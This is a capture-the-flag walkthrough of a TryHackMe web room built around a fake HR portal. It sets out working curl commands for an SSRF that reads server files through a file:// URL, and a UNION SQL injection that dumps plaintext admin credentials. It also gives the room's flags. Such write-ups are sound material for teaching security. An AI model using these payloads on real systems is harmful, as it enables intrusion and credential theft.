# TryHackMe: Recruit — Walkthrough

**Room type:** CTF (Premium)  
**Category:** Web / SQLi / SSRF  
**Flags:** 2  

| Flag | Value |
|------|-------|
| Normal user (HR) | `THM{LOGGED_IN_USER}` |
| Administrator | `THM{LOGGED_IN_ADM1N1}` |

---

## Overview

Recruit is a web application CTF built around a fictional HR portal for managing candidate applications. The premise: security was overlooked during development. The task is to approach it like a real attacker — map the surface, abuse exposed functionality, and escalate from unauthenticated visitor to administrator. The two-flag structure maps cleanly to two privilege levels: HR staff and admin.

---

## Reconnaissance

I started with a full port scan to understand what was running:

```bash
export IP=10.146.149.167
nmap -sV -sC --open -p- --min-rate 5000 $IP
```

Three ports came back:

- **22 (SSH)** — OpenSSH 8.2p1, standard, nothing to do here yet
- **53 (DNS)** — ISC BIND 9.16.1, unusual for a web app — worth probing
- **80 (HTTP)** — Apache 2.4.41, the main target

The DNS port was suspicious. I attempted a zone transfer immediately:

```bash
dig axfr @$IP recruit.thm
dig any @$IP recruit.thm
```

Both refused — BIND was running but not misconfigured for zone transfers. Dead end, but worth the 10 seconds.

The web app was a bare login page with two fields (username and password) and a single link in the footer: **Access API**. No registration, no password reset, nothing else visible without credentials. I added the domain to `/etc/hosts` and ran a directory scan while reading the API page:

```bash
echo "$IP recruit.thm" | sudo tee -a /etc/hosts
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,json -t 40
```

Gobuster returned a rich target list:

```
api.php          (Status: 200)
config.php       (Status: 200) [Size: 0]
dashboard.php    (Status: 302) → index.php
file.php         (Status: 200) [Size: 20]
footer.php       (Status: 200)
header.php       (Status: 200)
logout.php       (Status: 302)
mail/            (Status: 301)
phpmyadmin/      (Status: 301)
sitemap.xml      (Status: 200)
```

Several things jumped out immediately. `config.php` returns 200 with zero bytes — the PHP executes and produces no output, meaning it contains variable assignments, not echoed content. `file.php` has only 20 bytes, suggesting it's a thin wrapper around a file retrieval function. `phpmyadmin` is exposed. And there's a `mail/` directory worth checking.

The `sitemap.xml` confirmed the structure and dropped a useful comment in the XML:

```xml
<!-- Notes:
- Some directories may contain internal documentation or logs.
- Certain endpoints are intended for internal HR integrations.
- Access to sensitive data is role-restricted. -->
```

"Internal documentation or logs" pointed directly at the `mail/` directory.

---

## SSRF — Reading config.php

Clicking the **Access API** link led to `api.php`, which documented the CV retrieval endpoint:

> You can fetch a candidate CV using the following endpoint: `/file.php?cv=<URL>`
> The API supports fetching CVs from external URLs such as HTTP and HTTPS.

This is a classic **Server-Side Request Forgery** vector. The server fetches URLs on behalf of the user — and if `file://` is supported, it can read local files. I tested it against `config.php` immediately:

```bash
curl -s "http://$IP/file.php?cv=file:///var/www/html/config.php"
```

It returned the full source:

```php
$HR_PASSWORD = 'hrpassword123';
```

Along with a note that these credentials were "stored here temporarily for ease of access during the initial rollout phase." The SSRF gave us the HR password. I tried `file:///etc/passwd` and HTTP variants pointing at internal services — both were blocked. The filter allowed `file://` paths only within the webroot, which was still more than enough.

---

## Finding the Username — mail.log

The directory listing on `mail/` exposed a single file: `mail.log`. I pulled it:

```bash
curl -s http://$IP/mail/mail.log
```

It contained a deployment confirmation email from the HR team to IT support. The key line:

> HR login credentials **(username: hr)** are currently stored in the application configuration file (config.php) for ease of access during the initial rollout phase.

Username confirmed: `hr`. Password already known: `hrpassword123`.

---

## HR Login — Flag 1

The login form uses `name="login"` on the submit button, which means the PHP checks `isset($_POST['login'])` to know the form was submitted. Without that parameter, the login logic never fires and the server just returns the login page. I included it in the POST:

```bash
curl -si http://$IP/index.php \
  -X POST \
  -d "username=hr&password=hrpassword123&login=" \
  -c /tmp/hr_cookies.txt \
  -L | grep "THM"
```

```
THM{LOGGED_IN_USER}
```

**Flag 1 captured.** The dashboard loaded showing a candidate applications table with a search box at the top.

---

## Source Code Review — dashboard.php

Before attacking the search box blind, I used the SSRF to read the dashboard source and understand exactly what I was working with:

```bash
curl -s "http://$IP/file.php?cv=file:///var/www/html/dashboard.php"
```

The relevant section:

```php
$search = '';
if (isset($_GET['search'])) {
    $search = $_GET['search'];
    $query = "SELECT * FROM candidates WHERE name LIKE '%$search%'";
} else {
    $query = "SELECT * FROM candidates";
}
$result = mysqli_query($conn, $query);

if (!$result) {
    $sqlError = mysqli_error($conn);
}
```

And lower:

```php
<?php if (!empty($sqlError)): ?>
    <div class="alert alert-danger mt-2">
        <strong>SQL Error:</strong><br>
        <?= htmlspecialchars($sqlError); ?>
    </div>
<?php endif; ?>
```

Raw string concatenation into the query, with SQL errors echoed back to the page. Textbook error-based SQLi. The source also revealed that the admin flag lives at `/admin.txt` and is served when `$_SESSION['role'] === 'admin'` — so we needed to either become admin or extract the admin credentials from the database.

The DB connection was included from `/var/www/db.php` — outside the webroot. The SSRF returned "Access denied" for that path, meaning the file filter was path-restricted. That closed the shortcut of reading the DB credentials directly.

---

## SQL Injection — Dumping the Users Table

I confirmed the injection with a single quote:

```bash
curl -s "http://$IP/dashboard.php" \
  -b /tmp/hr_cookies.txt \
  -G --data-urlencode "search='"
```

```
SQL Error: You have an error in your SQL syntax; check the manual that 
corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

Injection confirmed and errors returned verbosely. The query structure is `LIKE '%INPUT%'`, so the injection point is inside a quoted string inside a LIKE clause. A UNION attack needed the right column count. Based on the table output (id, name, position, status = 4 columns), I tested:

```bash
curl -s "http://$IP/dashboard.php" \
  -b /tmp/hr_cookies.txt \
  -G --data-urlencode "search=' UNION SELECT 1,2,3,4-- -"
```

All four columns reflected in the output — column count confirmed. I then dumped the users table:

```bash
curl -s "http://$IP/dashboard.php" \
  -b /tmp/hr_cookies.txt \
  -G --data-urlencode "search=' UNION SELECT 1,username,password,4 FROM users-- -"
```

The response table contained:

```
admin | admin@001admin
```

Admin credentials in plaintext — no hashing.

---

## Admin Login — Flag 2

```bash
curl -si http://$IP/index.php \
  -X POST \
  -d "username=admin&password=admin@001admin&login=" \
  -c /tmp/admin_cookies.txt \
  -L | grep "THM"
```

```
THM{LOGGED_IN_ADM1N1}
```

**Flag 2 captured.**

---

## Full Attack Chain

```
Unauthenticated
    ↓
SSRF (file.php?cv=file://) → config.php → hrpassword123
    ↓
Directory listing (mail/) → mail.log → username: hr
    ↓
HR login → THM{LOGGED_IN_USER}
    ↓
SSRF → dashboard.php source → confirmed raw SQLi in search parameter
    ↓
UNION SQLi (search param) → users table → admin:admin@001admin
    ↓
Admin login → THM{LOGGED_IN_ADM1N1}
```

---

## Key Takeaways

**SSRF is a file read vulnerability as much as a network one.** The `file://` scheme turned a CV-fetching feature into a direct path to the application's source code. Reading `config.php` took one curl command and handed over the first credential.

**Directory listings are free recon.** The `mail/` directory was open, indexed, and contained a deployment email that spelled out the username explicitly. Access logs and deployment notes left in web-accessible directories are a regular finding in real engagements.

**Read the source before you inject blind.** The SSRF let me read `dashboard.php` before touching the search box. Two minutes of source review confirmed the exact query structure, the error output behavior, and the column count — saving a lot of blind trial and error.

**Error-verbose SQLi with no parameterized queries is a critical finding.** The search parameter was concatenated directly into the query string, errors were echoed back to the page, and the users table stored passwords in plaintext. Any one of those three would be a finding on its own; together they're a complete compromise in a single UNION query.
